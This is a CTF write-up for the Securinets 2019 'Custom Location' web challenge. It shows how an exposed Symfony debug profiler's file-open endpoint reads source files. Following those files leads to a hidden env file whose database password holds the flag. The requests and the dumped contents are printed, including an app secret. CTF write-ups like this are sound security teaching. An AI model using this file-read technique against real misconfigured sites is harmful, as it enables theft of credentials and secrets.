# Securinets Prequals CTF 2019 – Custom Location

* **Category:** Web
* **Points:** 964

## Challenge

> Try to find out the database credentials.
> 
> The author changed the location of some files to protect the web application from script kiddies.
> 
> https://web0.ctfsecurinets.com/
>
> Author:TheEmperors

## Solution

Trying to reach pages (e.g. `https://web0.ctfsecurinets.com/foo.php`) will trigger Symfony error pages. From these pages it is possible to access to the Symfony profiler interface.

Analyzing one of the results (`https://web0.ctfsecurinets.com/_profiler/open?file=public/index.php&line=27#line27`)

```php
<?php
use App\Kernel;
use Symfony\Component\Debug\Debug;
use Symfony\Component\HttpFoundation\Request;
require dirname(__DIR__).'/config/bootstrap.php';
if ($_SERVER['APP_DEBUG']) {
    umask(0000);
    Debug::enable();
}
if ($trustedProxies = $_SERVER['TRUSTED_PROXIES'] ?? $_ENV['TRUSTED_PROXIES'] ?? false) {
    Request::setTrustedProxies(explode(',', $trustedProxies), Request::HEADER_X_FORWARDED_ALL ^ Request::HEADER_X_FORWARDED_HOST);
}
Request::setTrustedProxies(['127.0.0.1/8','::1', '172.17.0.0/16','192.0.0.1', '10.0.0.0/8'], Request::HEADER_X_FORWARDED_ALL);
if ($trustedHosts = $_SERVER['TRUSTED_HOSTS'] ?? $_ENV['TRUSTED_HOSTS'] ?? false) {
    Request::setTrustedHosts([$trustedHosts]);
}
$kernel = new Kernel($_SERVER['APP_ENV'], (bool) $_SERVER['APP_DEBUG']);
$request = Request::createFromGlobals();
$response = $kernel->handle($request);
$response->send();
$kernel->terminate($request, $response);
```

an interesting file can be found: `require dirname(__DIR__).'/config/bootstrap.php';`.

Connecting to it (` https://web0.ctfsecurinets.com/_profiler/open?file=config/bootstrap.php`), you can find the complete path to the environment file.

```php
<?php
use Symfony\Component\Dotenv\Dotenv;
require dirname(__DIR__).'/vendor/autoload.php';
// Load cached env vars if the .env.local.php file exists
// Run "composer dump-env prod" to create it (requires symfony/flex >=1.2)
if (is_array($env = @include dirname(__DIR__).'/.env.local.php')) {
    $_SERVER += $env;
    $_ENV += $env;
} elseif (!class_exists(Dotenv::class)) {
    throw new RuntimeException('Please run "composer require symfony/dotenv" to load the ".env" files configuring the application.');
} else {
    // load all the .env files
    (new Dotenv())->loadEnv(dirname(__DIR__).'/secret_ctf_location/env');
}
$_SERVER['APP_ENV'] = $_ENV['APP_ENV'] = ($_SERVER['APP_ENV'] ?? $_ENV['APP_ENV'] ?? null) ?: 'dev';
$_SERVER['APP_DEBUG'] = $_SERVER['APP_DEBUG'] ?? $_ENV['APP_DEBUG'] ?? 'prod' !== $_SERVER['APP_ENV'];
$_SERVER['APP_DEBUG'] = $_ENV['APP_DEBUG'] = (int) $_SERVER['APP_DEBUG'] || filter_var($_SERVER['APP_DEBUG'], FILTER_VALIDATE_BOOLEAN) ? '1' : '0';
```

You can print the content of the environment file with `https://web0.ctfsecurinets.com/_profiler/open?file=/secret_ctf_location/env`.

Into the environment file you can find the flag.

```
# In all environments, the following files are loaded if they exist,
# the later taking precedence over the former:
#
#  * .env                contains default values for the environment variables needed by the app
#  * .env.local          uncommitted file with local overrides
#  * .env.$APP_ENV       committed environment-specific defaults
#  * .env.$APP_ENV.local uncommitted environment-specific overrides
#
# Real environment variables win over .env files.
#
# DO NOT DEFINE PRODUCTION SECRETS IN THIS FILE NOR IN ANY OTHER COMMITTED FILES.
#
# Run "composer dump-env prod" to compile .env files for production use (requires symfony/flex >=1.2).
# https://symfony.com/doc/current/best_practices/configuration.html#infrastructure-related-configuration
###> symfony/framework-bundle ###
APP_ENV=dev
APP_SECRET=44705a2f4fc85d70df5403ac8c7649fd
#TRUSTED_PROXIES=127.0.0.1,127.0.0.2
#TRUSTED_HOSTS='^localhost|example\.com$'
###< symfony/framework-bundle ###
###> doctrine/doctrine-bundle ###
# Format described at http://docs.doctrine-project.org/projects/doctrine-dbal/en/latest/reference/configuration.html#connecting-using-a-url
# For an SQLite database, use: "sqlite:///%kernel.project_dir%/var/data.db"
# Configure your db driver and server_version in config/packages/doctrine.yaml
DATABASE_URL=mysql://symfony_admin:Securinets{D4taB4se_P4sSw0Rd_My5qL_St0L3n}@127.0.0.1:3306/symfony_task
###< doctrine/doctrine-bundle ###
###> symfony/swiftmailer-bundle ###
# For Gmail as a transport, use: "gmail://username:password@localhost"
# For a generic SMTP server, use: "smtp://localhost:25?encryption=&auth_mode="
# Delivery is disabled by default via "null://localhost"
MAILER_URL=null://localhost
###< symfony/swiftmailer-bundle ###
```

The flag is the following.

```
Securinets{D4taB4se_P4sSw0Rd_My5qL_St0L3n}
```